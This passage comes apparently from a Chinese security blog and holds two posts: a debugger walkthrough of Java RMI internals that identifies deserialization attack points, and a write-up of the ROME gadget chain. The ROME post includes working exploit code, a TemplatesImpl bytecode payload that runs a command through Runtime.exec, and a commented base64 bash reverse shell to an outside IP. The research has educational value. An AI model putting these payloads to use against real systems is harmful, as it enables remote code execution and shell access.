的消息。客户端反序列化该对象，发现该对象是⼀个远程对象，地址在 172.17.88.209:24429，于是再与这个地址建⽴ TCP 连接；在这个新的连接中，才执⾏真正远程⽅法调⽤，也就是 sayHello()\nRMI Registry 就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但 RMI Server 可以在上⾯注册⼀个 Name 到对象的绑定关系；RMI Client 通过 Name 向 RMI Registry 查询，得到这个绑定关系，然后再连接 RMI Server；最后，远程⽅法实际上在 RMI Server 上调⽤。\n原理图如图\n\n\n\n那么我们可以确定 RMI 是一个基于序列化的 Java 远程方法调用机制。\n0x04 从 IDEA 断点分析 RMI 通信原理\nRMI 的这个流程是相当复杂的，需要师傅们有一定的耐心看下去。\n\n1. 流程分析总览首先 RMI 有三部分：\n\nRMI Registry\nRMI Server\nRMI Client\n\n如果两两通信就是 3+2+1 &#x3D; 6 个交互流程，还有三个创建的过程，一共是九个过程。\nRMI 的工作原理可以大致参考这张图，后续我会一一分析。\n\n2. 创建远程服务\n> 先行说明，创建远程服务这一块是不存在漏洞的。\n\n断点打在 RMIServer 的创建远程对象这里，如图\n\n\n发布远程对象开始调试，首先是到远程对象的构造函数 RemoteObjImpl，现在我们要把它发布到网络上去，我们要分析的是它如何被发布到网络上去的\nRemoteObjImpl 这个类是继承于 UnicastRemoteObject 的，所以先会到父类的构造函数，父类的构造函数这里的 port 传入了 0，它代表一个随机端口。\n\n\n\n这个过程不同于注册中心的 1099 端口，这是远程服务的。有很多文章在这个地方都交代的不清楚，误导了一些师傅。\n\n远程服务这里如果传入的是 0，它会被发布到网络上的一个随机端口，我们可以继续往下看一看。先 f8 到 exportObject()，再 f7 跳进去看。\nexportObject() 是一个静态函数，它就是主要负责将远程服务发布到网络上，如何更好理解 exportObject() 的作用呢？我们可以看到 RemoteObjImpl 这个实现类的构造函数里面，我注销了一句代码\npublic RemoteObjImpl() throws RemoteException &#123;  \n//     UnicastRemoteObject.exportObject(this, 0); // 如果不能继承 UnicastRemoteObject 就需要手工导出  \n &#125;\n\n如果不继承 UnicastRemoteObject 这个类的话，我们就需要手动调用这个函数。\n我们来看这个静态函数，第一个参数是 obj 对象，第二个参数是 new UnicastServerRef(port)，第二个参数是用来处理网络请求的。继续往下面跟，去到了 UnicastServerRef 的构造函数。这里跟的操作先 f7，然后点击 UnicastServerRef 跟进，这是 IDEA 的小技巧。\n\n\n跟进去之后 UnicastServerRef 的构造函数，我们看到它 new 了一个 LiveRef(port)，这个非常重要，它算是一个网络引用的类，跟进看一看。\n\n\n跟进去之后，先是一个构造函数，先跳进 this 看一看\n\n\n跳进 this 后的构造函数如下\npublic LiveRef(ObjID objID, int port) &#123;  \n    this(objID, TCPEndpoint.getLocalEndpoint(port), true);  \n&#125;\n\n第一个参数 ID，第三个参数为 true，所以我们重点关注一下第二个参数。\nTCPEndpoint 是一个网络请求的类，我们可以去看一下它的构造函数，传参进去一个 IP 与一个端口，也就是说传进去一个 IP 和一个端口，就可以进行网络请求。\n\n\n继续 f7 进到 LiveRef 的构造函数 this 里面\n\n\n这时候我们可以看一下一些赋值，发现 host 和 port 是赋值到了 endpoint 里面，而 endpoint 又是被封装在 LiveRef 里面的，所以记住数据是在 LiveRef 里面即可，并且这一 LiveRef 至始至终只会存在一个。\n\n\n上述是 LiveRef 创建的过程，然后我们再回到之前出现 LiveRef(port) 的地方\n\n回到上文那个地方，继续 f7 进入 super 看一看它的父类 UnicastRef，这里就证明整个创建远程服务的过程只会存在一个 LiveRef。一路 f7 到一个静态函数 exportObject()，我们后续的操作过程都与 exportObject() 有关，基本都是在调用它，这一段不是很重要，一路 f7 就好了。直到此处出现 Stub\n\n\n这里在我们服务端创建远程服务这一步居然出现了 stub 的创建，其实原理是这个样子的，来结合这张图一起说：\n\n\n\nRMI 先在 Service 的地方，也就是服务端创建一个 Stub，再把 Stub 传到 RMI Registry 中，最后让 RMI Client 去获取 Stub。\n\n\n接着我们研究 Stub 产生的这一步，先进到 createProxy 这个方法里面\n\n先进行了基本的赋值，然后我们继续 f8 往下看，去到判断的地方。\n\n\n这个判断暂时不用管，后续我们会碰到，那个时候再讲。\n再往下走，我们可以看到这是很明显的类加载的地方\n\n\n第一个参数是 AppClassLoader，第二个参数是一个远程接口，第三个参数是调用处理器，调用处理器里面只有一个 ref，它也是和之前我们看到的 ref 是同一个，创建远程服务当中永远只有一个 ref。\n此处就把动态代理创建好了，如图 Stub\n\n\n继续 f8，到 Target 这里，Target 这里相当于一个总的封装，将所有用的东西放到 Target 里面，我们可以进去看一看 Target 里面都放了什么。\n\n\n并且这里的几个 ref 都是同一个，通过 ID 就可以查看到它们是同一个。比如比较 disp 和 stub 的。一个是服务端 ，一个是客户端的，ID 是一样的，都是 818\n\n\n一路 f8，回到之前的 Target，下一条语句是 ref.exportObject(target)，也就是把 target 这个封装好了的对象发布出去。\n\n\n我们跟进去看一下它的发布逻辑是怎么一回事，一路 f7 到这里\n\n\n从这里开始，第一句语句 listen，真正处理网络请求了跟进去。\n\n\n先获取 TCPEndpoint，然后我们继续 f8 往后看，直到 server = ep.newServerSocket(); 这里。\n\n\n它创建了一个新的 socket，已经准备好了，等别人来连接，所以之后在 Thread 里面去做完成连接之后的事儿，这里我挂几张图展示一下运行的逻辑。\n\n\n\n\n并且这个 newServerSocket() 方法会给 port 进行赋值，核心语句如图\n\n\n然后回到 listen 去，一路 f8，观察一下整个流程结束之后 Target 里面是增加了 port。\n\n\n发布完成之后的记录\n也就是记录一下远程服务被发到哪里去了。\n\n第一个语句 target.setExportedTransport(this); 是一个简单的赋值，我们就不看了，看下面的 ObjectTable.putTarget(target);，跟进去，一路 f8，因为都是一些赋值的语句，直到此处。\n\n\nRMI 这里会把所有的信息保存到两个 table里面，有兴趣的师傅可以跟一下进去看看。\n\n\n我个人理解这段东西有点像日志。\n小结一下创建远程服务从思路来说是不难的，也就是发布远程对象，用 exportObject() 指定到发布的 IP 与端口，端口的话是一个随机值。至始至终复杂的地方其实都是在赋值，创建类，进行各种各样的封装，实际上并不复杂。\n还有一个过程就是发布完成之后的记录，理解的话，类似于日志就可以了，这些记录是保存到静态的 HashMap 当中。\n这一块是服务端自己创建远程服务的这么一个操作，所以这一块是不存在漏洞的。\n3. 创建注册中心 + 绑定\n创建注册中心与服务端是独立的，所以谁先谁后无所谓，本质上是一整个东西。\n\n断点打在此处，开始调试\n\n\n创建注册中心首先会经过一个静态方法 ———— createRegistry，继续往下，走到了 RegistryImpl 这个对象下，f8 进去，会发现新建了一个 RegistryImpl 对象。这里 122 行，判断 port 是否为注册中心的 port，以及是否开启了 SecurityManager，也就是一系列的安全检查，这部分不是很重要，继续 f8\n\n\n再往下走，它创建了一个 LiveRef，以及创建了一个新的 UnicastServerRef，这段代码就和我们上面讲的 创建远程对象 是很类似的，我们可以跟进 setup 看一下。\n\n\n跟进之后发现和之前是一样的，也是先赋值，然后进行 exportObject() 方法的调用。\n我这里贴两张图，第一张是发布远程对象的，第二张是创建注册中心的，师傅们可以对比对比。\n\n\n\n\n\n区别在于第三个参数的不同，名为 permanent，第一张是 false，第二张是 true，这代表我们创建注册中心这个对象，是一个永久对象，而之前远程对象是一个临时对象。\n\nf7 进到 exportObject，就和发布远程对象一样，到了创建 Stub 的阶段。\n\n\n\n那这个 Stub 是怎么创建的呢？诶 ~ 这里就和前面的有大不一样了。我们还是跟进 createProxy() 中，首先这里要做一个判断。\n\n\n\n可以跟进 stubClassExists 进行判断，我们看到这个地方，是判断是否能获取到 RegistryImpl_Stub 这个类，换句话说，也就是若 RegistryImpl_Stub 这个类存在，则返回 True，反之 False。我们可以找到 RegistryImpl_Stub 这个类是存在的。\n\n\n\n对比发布远程对象那个步骤，创建注册中心是走进到 createStub(remoteClass, clientRef); 进去的，而发布远程对象则是直接创建动态代理的。\n\n\n\n执行的这个方法也很简单，就是直接通过反射创建这个对象，里面放的就是 ref\n\n\n相比于之前发布远程对象中的 Stub，是一个动态代理，里面放的是一个 ref。现在发布远程对象是用 forName 创建的，里面放的也是 ref，是一致的。\n\n\n继续往下，如果是服务端定义好的，就调用 setSkeleton() 方法，跟进去。然后这里有一个 createSkeleton() 方法，一看名字就知道是用来创建 Skeleton 的，而 Skeleton 在我们的那幅图中，作为服务端的代理。\n\n\nSkeleton 是用 forName() 的方式创建的，如图。\n\n\n\n再往后走，又到了 Target 的地方，Target 部分的作用也与之前一样，用于储存封装的数据\n\n\n\n\n所以这一段和前面一样，就迅速跳过了，到如图这个地方。\n\n\n\n继续走，直到 super.exportObject(target); 这里，f7 跟进，到里面有一个 putTarget() 方法，它会把封装的数据放进去。\n\n\n一路 f8，到后面看一下到底放了什么东西进去。\n\n\n查看封装了哪些数据进去查看 static 中的数据，点开 objTable 中查看三个 Target，我们逐个分析一下，分析的话主要还是看 ref ~\n先点开这个 Target@930 的 value，主要关注几个参数：disp 中的 skel，以及 stub。它们的端口都是 1099，也就是说 1099 注册中心的一些端口数据都有了。这两个 ref 是同一个，可以对比着看一下。\n\n\n\n先点开这个 Target@1065 的 value，存储里面需要我们关注的有 stub 是 $Proxy 对象的，如图查看它们的 ref\n\n\n再点开 Target@1063 的 value 的 stub 值，发现它为 DGCImpl_Stub，是分布式垃圾回收的一个对象，它并不是我们刚才创建的。这个东西挺重要的。\n\n\n所以这里就是起了几个远程服务，一个端口是固定了，另外两个端口是不固定的，随机产生的。至于为什么这里有三个 Target 呢？\n\n这个我们在第六点里面会讲到。\n\n绑定\n绑定也就是最后一步，bind 操作\n\n断点下在 bind 语句那里。我们开始调试\n\n\n首先检查是否是本地绑定的，有兴趣的师傅们可以跟一下，是都会通过的，我这里就不跟了\n\n\n下一句检查一下 bindings 这里面是否有东西，其实 bindings 就是一个 HashTable。如果里面有数据的话就抛出异常。\n\n\n继续往前走，就是 bindings.put(name, obj);，也挺好理解的，就是把 IP 和端口放进去，到此处，绑定过程就结束了hhhh，是最简单的一个过程。\n\n\n小结一下创建注册中心 + 绑定\n总结一下比较简单，注册中心这里其实和发布远程对象很类似，不过多了一个持久的对象，这个持久的对象就成为了注册中心。\n\n绑定的话就更简单了，一句话形容一下就是 hashTable.put(IP, port)\n3. 客户端请求，客户端调用注册中心\n这一部分是存在漏洞的点，原因很简单，因为前文我们在 Wireshark 的抓包里头说到：”RMI 是一个基于序列化的 Java 远程方法调用机制”，这里有一些个有问题的反序列化 ~\n且听我娓娓道来\n\n客户端的请求分为三个阶段，获取注册中心，查找对象，\n获取注册中心这一块不存在漏洞，我们可以调试看一下，很简单。\n断点的话，三句代码都先下断点，接着开始调试。\n\n\n进到 getRegistry() 方法里面，继续往下走，这里调试部分大家可以自己看一下，都不难的，无非是一些赋值与判断，大致流程其实和之前是很像的，有 new LiveRef 的操作，有 Util.createProxy() 的操作，感兴趣的师傅们可以跟进去看一下，是一样的流程。也是通过 forName 的方式创建的。\n\n\n就和之前一样，新建了一个 Ref，然后把该封装的都封装到 Ref 里面进去。这里封装的是 127.0.01:1099 的，这里我们就获取到了注册中心的 Stub，下一步就是去查找远程对象。\n查找远程对象\n这里调试的话，因为对应的 Java 编译过的 class 文件是 1.1 的版本，无法进行打断点，所以会直接跳到其他地方去，比如此处。\n\n\n\n代码是可以按照正常的逻辑走的，就是打不了断点，问题不大，我们主要分析一下代码运行的逻辑。\n先看我们变量里面多了一个 param_1=&quot;remoteObj&quot;，这个东西就是传参的 String var1，这个 var1 最后是作为序列化的数据传进去的。注册中心后续会通过反序列化读取。\n\n\n接着下一步，我们看到 super.ref.invoke(var2);，super 就是父类，也就是我们之前说的 UnicastRef 这个类。这里的 invoke() 方法是类似于激活的方法，invoke() 方法里面会调用 call.executeCall()，它是真正处理网络请求的方法，也就是客户端的网络请求都是通过这个方法实现的。\n\n\n\n这个方法后续再细讲，先看整个代码运行的逻辑。\n\n我们的逻辑现在是从 invoke() —&gt; call.executeCall() —&gt; out.getDGCAckHandler()，到 out.getDGCAckHandler() 这个地方的时候，是 try 打头的，这里它有一个异常存在潜在攻击的可能性，如图，中间省略了部分代码。\n\n\n我们先看一下 in 这个变量是什么\n\n\n不难理解，in 就是数据流里面的东西。这里获取异常的本意应该是在报错的时候把一整个信息都拿出来，这样会更清晰一点，但是这里就出问题了 ———— 如果一个注册中心返回一个恶意的对象，客户端进行反序列化，这就会导致漏洞。这里的漏洞相比于其他漏洞更为隐蔽。\n\n也就是说，只要调用 invoke()，就会导致漏洞。RMI 在设计之初就并未考虑到这个问题，导致客户端都是易受攻击的。\n\n上述就是注册中心与客户端进行交互时会产生的攻击。\n我们这里继续 f8，看一下到最后一步的时候获取到了什么数据。简单来说就是获取到了 RemoteObj 这个动态代理，其中包含一个 ref。\n\n\n4. 客户端请求，客户端请求服务端\n存在漏洞\n\n这里就是客户端请求的第三句代码 ———— remoteObj.sayHello(&quot;hello&quot;); 的运行逻辑。\n这里如果 Debug 有问题的话，可以先在 RemoteObjectInvocationHandler 类下的 invoke() 方法的 if 判断里面打个断点，这样才能走进去。调试开始\n\n\n下面是一堆 if 的判断，都是关于抛出异常的，这里就不再细看了，直接跳过。直到尾部这个地方，我们跟进去看一下。 \n\n\n跟进到此处，ref.invoke()，这是一个重载的方法，跟进到重载的 invoke() 方法里面。这个重载的 invoke 方法作用是创建了一个连接，和之前也比较类似。我们可以看一下它具体的逻辑实现。\n\n\n继续往里走，在循环里面有一个 marshalValue() 方法。\n\n\n它会序列化一个值，这个值其实就是我们传进的参数 hello，它的逻辑如图。判断一堆类型，之后再进行序列化。\n\n\n继续往前走，我们看到一个注释 // unmarshal return，后面接的是 call.executeCall()，之前我们也看到了这个方法，也就是说只要 RMI 处理网络请求，就一定会执行到这个方法，这里是存在危险的，原理上面已经代码跟过一遍了 ~\n所以我们直接往后看。\n\n这里有一个 unmarshalValueSee 的方法，因为现在我们传进去的类型是 String，不符合上面的一系列类型，这里会进行反序列化的操作，把这个数据读回来，这里是存在入口类的攻击点的。\n\n\n\n\n\n这个数据会被读回来\n\n\n关于客户端一系列主动请求的小结\n先说说存在攻击的点吧，在注册中心 –&gt; 服务端这里，查找远程对象的时候是存在攻击的。\n\n具体表现形式是服务端打客户端，入口类在 call.executeCall()，里面抛出异常的时候会进行反序列化。这里可以利用 URLClassLoader 来打，具体的攻击在后续文章会写。\n在服务端 —&gt; 客户端这里，也是存在攻击的，一共是两个点：一个是 call.executeCall()，另一个点是 unmarshalValueSee 这里。\n\n再总结一下代码的流程\n\n分为三步走，先获取注册中心，再查找远程对象，查找远程对象这里获取到了一个 ref，最后客户端发出请求，与服务端建立连接，进行通信。\n5. 客户端发起请求，注册中心如何处理先说说断点怎么打，因为客户端那里，我们操作的是 Stub，服务端这边操作的是 Skel。在有了 Skel 之后应当是存在 Target 里面的，所以我们的断点打到处理 Target 的地方。\n断点位置如图\n\n\n先点 Server 的 Debug，再跑 Client 就可以了，成功的打断点如图\n\n\n往下走，我们先看一看 Target 里面包含了什么\n\n\n里面包含一个 stub，stub 中是一个 ref，这个 ref 对应的是 1099 端口。\n\n\n再往下走 final Dispatcher disp = target.getDispatcher(); 是将 skel 的值放到 disp 里面。\n\n\n继续往下走，它会调用 disp 的 dispatch 方法，我们跳进去看一下 disp.dispatch()\n\n\n继续走，我们目前的 skel 不为 null，会到 oldDispatch() 这里，跟进。\n\n\n下面就是 skel.dispatch() 的过程了，这里才是重点，这里就是很多师傅文章里面会提到的 客户端打注册中心 的攻击方式。\n\n\n\n先介绍一下这段源码吧，很长，基本都是在做 case 的工作。\n\n我们与注册中心进行交互可以使用如下几种方式：\n\nlist\nbind\nrebind\nunbind\nlookup\n\n这几种方法位于 RegistryImpl_Skel#dispatch 中，也就是我们现在 dispatch 这个方法的地方。\n如果存在对传入的对象调用 readObject 方法，则可以利用，dispatch 里面对应关系如下：\n\n0-&gt;bind\n1-&gt;list\n2-&gt;lookup\n3-&gt;rebind\n4-&gt;unbind\n\n只要中间是有反序列化就是可以攻击的，而且我们是从客户端打到注册中心，这其实是黑客们最喜欢的攻击方式。我们来看一看谁可以攻击。\n\n\n\n\n\n\n\n\n也就是除了 list 都可以。\n小结一下客户端发起请求，注册中心做了什么简单，注册中心就是处理 Target，进行 Skel 的生成与处理。\n漏洞点是在 dispatch 这里，存在反序列化的入口类。这里可以结合 CC 链子打的。\n6. 客户端发起请求，服务端做了什么\n这个流程是比较简单的，同第四点一样，此处得到的 Skel 是动态代理 $Proxy0 这个类的，之前我们提到过其实是封装了三个 Target 的，这就是其中之一。\n\n这里的断点位置打两个，如图：\n\n\n也就是当前请求到的是服务端的 Target，我们开始调试。\n\n调试这里有一点小坑，打完两个断点之后，我们得到的第一个 Target 中的 Stub 是 DGCImpl 的，我们要的不是这个，前文我们提到过，这个类是用来处理内存垃圾的。\n\n动态代理的 stub这里要摁两下一下 f9，直至有 Proxy 动态代理的 stub 为止，如图：\n\n\n在这种情况下，我们到 dispatch() 方法下，跟进。\n\n\n这里的 skel 为 null，所以不会执行 oldDispatch 方法，如图\n\n\n继续往下走，获取到输入流，以及 Method，Method 就是我们之前写的 sayHello() 方法。\n\n\n继续往下走，重点部分来了 ———— 循环当中的 unmarshalValue() 方法，这里和我们之前说的一样，是存在漏洞的。\n\n\n这里的流程和之前是一致的，也就是我们的 &quot;hello&quot; 传参传进去，序列化读进去，反序列化读出来，和之前是一致的。\nDGC 的 stub三个 Target 当中的一个，如图\n\n\n断点需要下在 ObjectTable 类的 putTarget() 方法里面。并且将前面两个断点去掉，直接调试即可。\n\n\n\n首先我们去看一看 DGC 的运行原理是什么\n\n还是比较简单的，将 Target 放到一个静态表里面，这里静态表就是我在第三点说的，ObjectTable 里面封装了三个 Target。\n\n\n然后这里我们会发现，放进去的是 Proxy 这个动态代理的 Target 而非 DGC 的 Target。\n这个 DGC 的 Target 挺奇妙的，是已经被封装到了 static 里面，我们去看 static 里面，发现它已经被封装进去了。\n\n\n\n那它到底是怎么创建的呢？我们一步步看。\n\n\n在 DGC 这个类在调用静态变量的时候，就会完成类的初始化。\n\n类的初始化是由 DGCImpl 这个类完成的，我们跟到 DGCImpl 中去看，发现里面有一个 static 方法，作用是 class initializer \n\n\n\n我们可以在创建对象的地方打个断点。\n\n后续的过程，首先是 new 了很多对象，这些其实都是 Target 的一堆属性，不过这是封装之前的。\n后续的部分，createProxy() 方法这里，和注册中心创建远程服务的特别像。\n\n\n从 createProxy() 方法进去，会看到一个 createStub() 方法，跟进去。\n\n\n这里和注册中心创建远程服务一样，尝试是否可以获取到这一个类 ———— DGCImpl_Stub\n\n\n这一个 DGCImpl_Stub 的服务至此已经被创建完毕了，它也是类似于创建远程服务一样，但是它做的业务不一样。注册中心的远程服务是用于注册的，这个是用于内存回收的，且端口随机。\n\n\nsetSkeleton() 这个过程就是在 disp 里面创建 skel，和之前是一样的。\n调用过程是与第 3、4 点讲的一样的，这里就不重复了。\n我们重点关注一下 DGC 的 Stub 里面有漏洞的地方。\n到 DGCImpl_Stub 这个类下，它有两个方法，一个是 clean，另外一个是 dirty。clean 就是”强”清除内存，dirty 就是”弱”清除内存。\n这里调用了 readObject() 方法，存在反序列化的入口类。\n\n\n同样在 DGCImpl_Skel 这个类下也存在反序列化的漏洞，如图。\n\n\n小结一下 DGC 的过程\n是自动创建的一个过程，用于清理内存。\n\n漏洞点在客户端与服务端都存在，存在于 Skel 与 Stub 当中。这也就是所谓的 JRMP 绕过\n0x05 总结\n如果是漏洞利用的话，单纯攻击 RMI 意义是不大的，不论是 codespace 的那种利用，难度很高，还是说三者互相打这种，意义都不是很大，因为在 jdk8u121 之后都基本修复完毕了。\n\nRMI 多数的利用还是在后续的 fastjson，strust2 这种类型的攻击组合拳比较多，希望这篇文章能对正在学习 RMI 的师傅们提供一点帮助。\n具体的攻击 payload 可以看我另外一篇文章 \n0x06 参考资料https://www.bilibili.com/video/BV1L3411a7ax?p=10&amp;vd_source=a4eba559e280bf2f1aec770f740d0645\nhttps://johnfrod.top/%e5%ae%89%e5%85%a8/rmi%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96/\n","categories":["Java"],"tags":["Java"]},{"title":"Java反序列化之ROME链","url":"/2022/10/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BROME%E9%93%BE/","content":"Java Rome 链\n\nJava 反序列化之 ROME 链0x01 前言原本打算先学一手 Java Agent 内存马的，碰巧有位师傅问了我一下 Rome 反序列化链子的东西，想着就先学 ROME 反序列化吧\n0x02 环境与 ROME 简介环境jdk8u65（因为 8u65 我打了 openjdk 的包，分析起来比较方便\npom.xml\n&lt;dependency>  \n    &lt;groupId>rome&lt;/groupId>  \n    &lt;artifactId>rome&lt;/artifactId>  \n    &lt;version>1.0&lt;/version>  \n&lt;/dependency>  \n&lt;dependency>  \n    &lt;groupId>org.javassist&lt;/groupId>  \n    &lt;artifactId>javassist&lt;/artifactId>  \n    &lt;version>3.28.0-GA&lt;/version>  \n&lt;/dependency>\n\n\n讲个有趣的小插曲\n\n一般来说，这种依赖在 mvnrepository 里面肯定是有的，结果我去 mvnrepository 里面找 ROME 的包，发现没有 1.0 的包，但是 maven 还是能把它打包进来，挺有趣的哈哈哈\n\n\nROME 简介\n一句话概括一下，就是一个 RSS 阅读器\n\nROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。\nRome 提供了 ToStringBean 这个类，提供深入的 toString 方法对 JavaBean 进行操作。\n0x03 ROME 链挖掘还是和之前一样，尝试一下自己可不可以独立复现这个漏洞，找全整条链子。\n艰辛的寻找链尾之路先看这个包里面的 io 文件夹，里面是一些输入输出流的处理类，有我们在 XXE 里面见过的一些类，比如 SAXBuilder，XmlReader 等类，就先不看 io 文件夹里面的类了。\n\n\n想着这么寻找链子，一个个看过去也不是个事儿啊，所以我还是打开了全局搜索，在文件夹里面搜索 jndi 关键词，结果发现屁都没有\n\n\n然后找了很久都没有找到，太难了，还是直接看其他师傅的链尾了；发现链尾是 TemplatesImpl.getOutputProperties()，难怪没找到了，只去到包里面找了，太局限了；很多时候包只是作为链子的一部分 sink，而不是漏洞点，算是给自己涨了点经验。\n有趣的是，自己当时学习的时候先放了放 ROME 链的知识点，准备去复现一道 2022 长城杯的 b4byCoffee，听杰哥说这个题目是一个 TemplatesImpl 动态加载字节码的攻击手法；\n结果发现就是 ROME 的链，而且 ROME 是作为 sink 的，有意思，Java 安全融会贯通的感觉来了\nROME 链流程分析这里太细太细太细了，如果按照之前的思路，我们去找谁调用了 .getOutputProperties() 方法，应该是可以找到一个可用链子的，但是这里我去 find usages 居然是这样的\n\n\n看了其他师傅的文章分析才知道，原来这里链子的下一步是 ToStringBean.toString()，这里太妙了，我们可以先去看一下 ToStringBean.toString() 的代码逻辑\n\n\n这里，我们先通过 BeanIntrospector.getPropertyDescriptors(_beanClass) 获取到 _beanClass 中的任意 getter 方法，注释里面也写的比较清晰；在获取完任意 getter 方法后，做了一系列基本的判断 ———— 确保 getter 方法不为空，确保能够调用类的 getter 方法，确保里面可以传参。\n在完成基础的三项判断之后，进行执行\nObject value = pReadMethod.invoke(_obj,NO_PARAMS);\n\n这里的 pReadMethod.invoke() 就类似于我们之前在反射中看的 method.invoke() 一样。\n再来关注一下里面的传参，_obj 是被实例化的类，NO_PARAMS 是一个常量，我猜测这里应该是对应的传参个数。\n\n说了这么多，基础扎实的师傅很容易就能够看出来，pReadMethod.invoke() 是可以触发 TemplatesImpl.getOutputProperties() 的\n这只是反射的写法而已，写一段伪代码供师傅们理解\n\nClass _beanClass = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\");\nObject _obj = _beanClass.newInstance();\nMethod pReadMethod = _beanClass.getDeclaredMethod(\"getOutputProperties\");\npReadMethod.invoke(_obj,NO_PARAMS)\n\t\n// 等价于 TemplatesImpl.getOutputProperties()\n// 用 ToStringBean.toString() 触发也可以，我这里更关注反射\n\nOK，此处基础的链尾已经打通，我们点击去看一下 _obj 和 _beanClass 是否可以直接赋值，跟进一下。\n\n\n果不其然，这个构造函数是可以帮我们省去一些代码量的，后续可能会用到，先 cy 一下。\n继续分析，我们应该是去看谁调用了 toString() 方法，想到 toString() 方法，就想起来之前有个 toString() 的坑让人非常印象深刻，找了找，是在 CC6 链子里面的，放个传送门 ———— Java反序列化Commons-Collections篇03-CC6链\n\n所以此处根据 CC6 的链子分析，后半段就是 URLDNS 链了，简单看一下\n\n后半段是 HashMap 的链子，尾部是到 hashCode() 方法，\nxxx.readObject()\n    HashMap.put()\n    HashMap.hash()\n        xxx.hashCode()\n\n我们需要找到 hashCode() —– toString() 中间可利用的一条 sink，这里如果要自己找，难度还是比较大的，就直接拿现成的啦 ~\n中间的 sink 是 EqualsBean 类，去到  EqualsBean 类里头看一看\n\n\nbeanHashCode() 是一个完美契合我们需求的方法，这条链子到这儿就完成了\n画个流程图总结一下 ROME 链子\n\n\nROME 链 EXP 编写\n先写个 TemplatesImpl 的链子兜个底\n\npublic class TemplatesImplEXP &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n        setFieldValue(templates,\"_name\",\"Drunkbaby\");  \n        setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl());  \n        Class c = templates.getClass();  \n        Field byteCodesField = c.getDeclaredField(\"_bytecodes\");  \n        byteCodesField.setAccessible(true);  \n        byte[] evil = getTemplatesImpl(\"Calc\");  \n        byte[][] codes = &#123;evil&#125;;  \n        byteCodesField.set(templates,codes);  \n  \n        templates.newTransformer();  \n    &#125;  \n  \n    public static byte[] getTemplatesImpl(String cmd) &#123;  \n        try &#123;  \n            ClassPool pool = ClassPool.getDefault();  \n            CtClass ctClass = pool.makeClass(\"Evil\");  \n            CtClass superClass = pool.get(\"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\");  \n            ctClass.setSuperclass(superClass);  \n            CtConstructor constructor = ctClass.makeClassInitializer();  \n            constructor.setBody(\" try &#123;\\n\" +  \n                    \" Runtime.getRuntime().exec(\\\"\" + cmd +  \n                    \"\\\");\\n\" +  \n                    \" &#125; catch (Exception ignored) &#123;\\n\" +  \n                    \" &#125;\");  \n            // \"new String[]&#123;\\\"/bin/bash\\\", \\\"-c\\\", \\\"&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMC4xMS4yMzEvOTk5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\\\"&#125;\"  \n byte[] bytes = ctClass.toBytecode();  \n            ctClass.defrost();  \n            return bytes;  \n        &#125; catch (Exception e) &#123;  \n            e.printStackTrace();  \n            return new byte[]&#123;&#125;;  \n        &#125;  \n    &#125;  \n  \n    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception &#123;  \n        Class clazz = object.getClass();  \n        Field field = clazz.getDeclaredField(fieldName);  \n        field.setAccessible(true);  \n        field.set(object,value);  \n    &#125;  \n&#125;\n\n\n\n构造下一步的 EXP\npublic class ToStringBeanEXP &#123;  \n    public static void main(String[] args) throws Exception &#123;  \n        TemplatesImpl templates = new TemplatesImpl();  \n        setFieldValue(templates,\"_name\",\"Drunkbaby\");  \n        setFieldValue(templates,\"_tfactory\",new TransformerFactoryImpl());  \n        Class c = templates.getClass();  \n        Field byteCodesField = c.getDeclaredField(\"_bytecodes\");  \n        byteCodesField.setAccessible(true);  \n        byte[] evil = getTemplatesImpl(\"Calc\");  \n        byte[][] codes = &#123;evil&#125;;  \n        byteCodesField.set(templates,codes);  \n//        templates.newTransformer();  \n ToStringBean toStringBean = new ToStringBean(c,templates);  \n        toStringBean.toString();  \n  \n    &#125;  \n  \n    public static byte[] getTemplatesImpl(String cmd) &#123;  \n        try &#123;  \n            ClassPool pool = ClassPool.getDefault();  \n            CtClass ctClass = pool.makeClass(\"Evil\");  \n            CtClass superClass = pool.get(\"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\");  \n            ctClass.setSuperclass(superClass);  \n            CtConstructor constructor = ctClass.makeClassInitializer();  \n            constructor.setBody(\" try &#123;\\n\" +  \n                    \" Runtime.getRuntime().exec(\\\"\" + cmd +  \n                    \"\\\");\\n\" +  \n                    \" &#125; catch (Exception ignored) &#123;\\n\" +  \n                    \" &#125;\");  \n            // \"new String[]&#123;\\\"/bin/bash\\\", \\\"-c\\\", \\\"&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMC4xMS4yMzEvOTk5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\\\"&#125;\"  \n byte[] bytes = ctClass.toBytecode();  \n            ctClass.defrost();  \n            return bytes;  \n        &#125; catch (Exception e) &#123;  \n            e.printStackTrace();  \n            return new byte[]&#123;&#125;;  \n        &#125;  \n    &#125;  \n  \n    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception &#123;  \n        Class clazz = object.getClass();  \n        Field field = clazz.getDeclaredField(fieldName);  \n        field.setAccessible(true);  \n        field.set(object,value);  \n    &#125;  \n&#125;\n\n\n\n这里有点坑，一开始脑子里想的都是调用 toString(String)，后来发现这是个 private 调用不了，要用 toString() 普通的这个去触发。\n继续往下走，写 EXP\nToStringBean toStringBean = new ToStringBean(c,templates);    \n Class toStringBeanEvil = toStringBean.getClass();  \nEqualsBean equalsBean = new EqualsBean(toStringBeanEvil,toStringBean);  \nequalsBean.beanHashCode();\n\n\n\n再往下，是 HashMap，我就直接尝试构造完整的 EXP 了\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  \nimport 